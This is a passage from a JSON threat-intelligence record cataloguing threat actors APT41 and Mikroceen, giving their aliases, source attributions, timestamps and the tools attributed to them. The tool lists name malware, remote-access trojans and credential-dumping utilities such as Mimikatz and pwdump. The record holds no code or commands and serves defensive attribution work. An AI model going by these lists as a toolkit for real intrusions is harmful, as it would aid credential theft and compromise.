                "ELFSHELF",
                "EasyNight",
                "Farfli",
                "FunnySwitch",
                "Gh0st RAT",
                "Ghost RAT",
                "HDD Rootkit",
                "HDRoot",
                "HKDOOR",
                "HOMEUNIX",
                "HUI Loader",
                "HidraQ",
                "HighNoon",
                "HighNote",
                "Homux",
                "Hydraq",
                "Jorik",
                "Jumpall",
                "KEYPLUG",
                "Kaba",
                "Korplug",
                "LATELUNCH",
                "LOLBAS",
                "LOLBins",
                "LightSpy",
                "Living off the Land",
                "Lowkey",
                "McRAT",
                "MdmBot",
                "MessageTap",
                "Meterpreter",
                "Mimikatz",
                "MoonBounce",
                "MoonWalk",
                "Motnug",
                "Moudour",
                "Mydoor",
                "NTDSDump",
                "PACMAN",
                "PCRat",
                "PINEGROVE",
                "PNGRAT",
                "POISONPLUG",
                "POISONPLUG.SHADOW",
                "POTROAST",
                "PRIVATELOG",
                "PipeMon",
                "PlugX",
                "PortReuse",
                "ProxIP",
                "ROCKBOOT",
                "RbDoor",
                "RedDelta",
                "RedXOR",
                "RibDoor",
                "Roarur",
                "RouterGod",
                "SAGEHIRE",
                "SPARKLOG",
                "SQLULDR2",
                "STASHLOG",
                "SWEETCANDLE",
                "ScrambleCross",
                "Sensocode",
                "SerialVlogger",
                "ShadowHammer",
                "ShadowPad Winnti",
                "SinoChopper",
                "Skip-2.0",
                "SneakCross",
                "Sogu",
                "Speculoos",
                "Spyder",
                "StealthReacher",
                "StealthVector",
                "TERA",
                "TIDYELF",
                "TIGERPLUG",
                "TOMMYGUN",
                "TVT",
                "Thoper",
                "Voldemort",
                "WIDETONE",
                "WINNKIT",
                "WINTERLOVE",
                "Winnti",
                "WyrmSpy",
                "X-Door",
                "XDOOR",
                "XMRig",
                "XShellGhost",
                "Xamtrav",
                "ZXShell",
                "ZoxPNG",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "gresim",
                "njRAT",
                "pwdump",
                "xDll"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c7097f4-849b-4bc0-a7e6-ba2b510722b6",
            "created_at": "2022-10-25T16:07:23.869951Z",
            "updated_at": "2025-03-27T02:02:10.003542Z",
            "deleted_at": null,
            "main_name": "Mikroceen",
            "aliases": [
                "SixLittleMonkeys"
            ],
            "source_name": "ETDA:Mikroceen",
            "tools": [
                "AngryRebel",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "Microcin",
                "Mikroceen",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "PCRat",
                "logon.dll",
                "logsupport.dll",
                "pcaudit.bat",
                "sqllauncher.dll"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536003,
    "ts_updated_at": 1743041804,
    "ts_creation_date": 1653697685,
    "ts_modification_date": 1653697685,
    "files": {
        "pdf": "https://archive.orkl.eu/302ce766c8617917cbaa29874d8093ba2e4d90b9.pdf",
        "text": "https://archive.orkl.eu/302ce766c8617917cbaa29874d8093ba2e4d90b9.txt",
        "img": "https://archive.orkl.eu/302ce766c8617917cbaa29874d8093ba2e4d90b9.jpg"
    }
}